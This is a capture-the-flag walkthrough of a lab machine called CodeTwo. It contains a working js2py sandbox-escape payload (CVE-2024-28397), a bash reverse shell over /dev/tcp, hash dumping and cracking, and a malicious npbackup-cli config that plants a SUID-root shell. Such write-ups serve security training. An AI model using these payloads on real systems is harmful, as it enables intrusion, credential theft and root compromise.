## 1\. Port Scanning

We begin with a comprehensive **nmap** scan to identify open services:

```plaintext
nmap -sV -sC -p- 10.10.11.82 -oN nmap_scan.txt
```

**Results:**

```plaintext
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http    Gunicorn 20.0.4
```

The scan reveals:

* **SSH (22/tcp)** → Standard OpenSSH service
    
* **HTTP (8000/tcp)** → Gunicorn web server (Python WSGI HTTP Server)
    

## 2\. Initial Access

## Web Enumeration

Navigate to the web app:

```plaintext
firefox http://10.10.11.82:8000
```

We discover **CodeTwo**, a web-based JavaScript editor with:

* User registration & login
    
* Online code execution using **js2py**
    

After registering a user and logging in, the IDE allows execution of arbitrary JS code.

## Source Code Discovery

The application has a **download** option which gives

```plaintext
app.zip
```

Extract and review:

```plaintext
wget http://10.10.11.82:8000/download/app.zip -O app.zip
unzip app.zip -d app_src
cd app_src
cat app.py
```

Key discovery in

```plaintext
app.py
:

result = js2py.eval_js(code)
```

The app executes **user-supplied JS code** using

```plaintext
js2py
```

## Vulnerability: CVE-2024–28397 (js2py Sandbox Escape)

The `eval_js` function is vulnerable to a sandbox escape in js2py ≤ 0.74.  
It allows access to Python internals and execution of OS commands.

## 3\. Exploitation

## Reverse Shell Exploit

Set up a listener:

```plaintext
nc -lvnp 4444
```

Exploit payload to paste into the CodeTwo JS editor:

```plaintext
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'";
let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");

obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
"OK";
```

Result: **Reverse shell as**

```plaintext
app@codetwo:~/app$
```

## Extracting User Credentials

From the shell, we find a SQLite DB at instance folder:

```plaintext
cd /app/instance
ls
sqlite3 user.db "SELECT * FROM users;"
```

Hashes found:

```plaintext
649c9d65a206a75f5abe509fe128bce5
a97588c0e2fa3a024876339e27aeb42e
```

Save them to `hashes.txt` and crack with John:

```plaintext
echo "649c9d65a206a75f5abe509fe128bce5" > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Result:**

```plaintext
marco : sweetangelbabylove
```

## 4\. User Shell

Login via SSH:

```plaintext
ssh marco@10.10.11.82
# password: sweetangelbabylove
```

Grab the user flag:

```plaintext
cat /home/marco/user.txt
```

**User Flag:** ✅

## 5\. Privilege Escalation

## Enumeration

Check sudo rights:

```plaintext
sudo -l
```

Output:

```plaintext
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

This custom tool is group-accessible and supports

```plaintext
pre_exec_commands
```

in its config.

## Exploit npbackup-cli

Create a malicious config

```plaintext
/dev/shm/pwn.yml
```

:

```plaintext
cat >/dev/shm/pwn.yml <<'YML'
conf_version: 3.0.1
repos:
  default:
    repo_uri: /dev/shm/repo
    repo_group: default_group
    backup_opts:
      paths:
      - /etc
      source_type: folder_list
    repo_opts:
      repo_password: "haxpass"
      retention_policy: {}
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      pre_exec_commands:
        - /bin/sh -c 'cp /bin/bash /tmp/broot && chmod u+s /tmp/broot'
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
identity:
  machine_id: exploit
  machine_group: exploit
global_prometheus:
  metrics: false
  instance: exploit
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
YML
chmod 666 /dev/shm/pwn.yml
```

Run backup to trigger payload:

```plaintext
echo test | sudo /usr/local/bin/npbackup-cli -c /dev/shm/pwn.yml --stdin
```

Check payload result:

```plaintext
ls -l /tmp/broot
```

We now have a **SUID-root bash**.

## Root Shell

Run:

```plaintext
/tmp/broot -p
id
cat /root/root.txt
```

**Root Flag:** ✅ (redacted)

## 6\. Summary

* **Recon:** Nmap revealed SSH + Gunicorn web server
    
* **Initial Access:** Discovered CodeTwo JS IDE → Source leak → js2py sandbox escape (CVE-2024–28397) → Reverse shell
    
* **User:** Extracted MD5 hash → cracked Marco’s password → SSH access → User flag
    
* **Privilege Escalation:** Abused
    

```plaintext
npbackup-cli
```

sudo with malicious config → Root shell → Root flag
